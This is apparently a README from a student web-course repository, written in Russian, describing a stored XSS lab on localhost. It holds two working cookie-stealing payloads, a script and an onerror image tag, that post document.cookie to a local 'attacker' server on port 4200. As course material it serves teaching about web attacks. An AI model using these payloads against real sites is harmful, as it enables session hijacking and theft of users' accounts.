# web-practice
web course tasks
<h1>Хранимая xss атака</h1>
<h2>Кихтенко Татьяна, КН-302</h2>
<h3>Воруем куки:</h3>
<ol>
<li>Запускаем сервера сайта(порт 3000) и мошенника(4200) </li>
<li>Переходим на форму: <code>localhost:3000/register</code></li>
<li>Мошенник вводит в форму зловредный скрипт, например<br>
<code>
 <script>let stealImg = document.createElement('img');stealImg.src = 'http://127.0.0.1:4200/steal?cookie=' + document.cookie;document.body.appendChild(stealImg);</script>
 <img id="stealImg" width='0px' height='0px'><img src='' onerror="stealImg.src='http://127.0.0.1:4200/steal?cookie=' + document.cookie;">
</code>
</li>
<li>Жертва переходит на <code>localhost:3000/register</code> и дружелюбно заполняет данные</li>
<li>Жертву редиректят на тред комментариев к посту -- т.е. скрипт злоумышленника подгружается как комментарий</li>
<li>Так, с помощью несуществующей картинки, злоумышленник получил кукисы жертвы на своем сервере</li>
</ol>
